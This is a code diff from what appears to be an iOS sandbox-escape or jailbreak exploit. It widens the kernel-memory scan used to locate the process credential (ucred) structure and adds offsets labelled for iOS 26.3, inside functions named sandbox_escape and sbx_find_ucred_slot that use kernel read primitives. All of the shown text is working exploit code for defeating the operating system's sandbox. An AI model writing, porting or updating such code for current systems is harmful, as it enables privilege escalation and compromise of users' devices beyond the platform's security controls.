@@ -28,6 +28,9 @@ extern void early_kread(uint64_t where, void *read_buf, size_t size);
 #define OFF_UCRED_CR_LABEL     0x78  // ucred → cr_label (KDK struct dump)
 #define OFF_LABEL_SANDBOX      0x10  // label → sandbox (MAC l_perpolicy[1])
 #define OFF_SANDBOX_EXT_SET    0x10  // sandbox → ext_set
+// iOS 26.3: ucred scan range may have shifted — extend to 0x60
+#define OFF_PROC_RO_UCRED_SCAN_START 0x10
+#define OFF_PROC_RO_UCRED_SCAN_END   0x60
 #define OFF_EXT_DATA           0x40  // ext → data_addr
 #define OFF_EXT_DATALEN        0x48  // ext → data_len
 
@@ -123,7 +126,7 @@ int sandbox_escape(uint64_t self_proc) {
     // p_ucred is an SMR pointer. Dump offsets 0x10-0x40 to find it.
     NSLog(@"[SBX] Scanning proc_ro for ucred...");
     uint64_t ucred = 0;
-    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
+    for (uint32_t off = 0x10; off <= 0x60; off += 0x8) {
         uint64_t raw = early_kread64(proc_ro + off);
         uint64_t smr = kread_smrptr(proc_ro + off);
         uint64_t pac = S(raw);
@@ -217,7 +220,7 @@ static int sbx_find_ucred_slot(uint64_t proc, uint64_t *ucred_out, uint32_t *off
     uint64_t proc_ro = S(early_kread64(proc + OFF_PROC_PROC_RO));
     if (!K(proc_ro)) return -1;
 
-    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
+    for (uint32_t off = 0x10; off <= 0x60; off += 0x8) {
         uint64_t raw = early_kread64(proc_ro + off);
         uint64_t smr = kread_smrptr(proc_ro + off);
         uint64_t pac = S(raw);
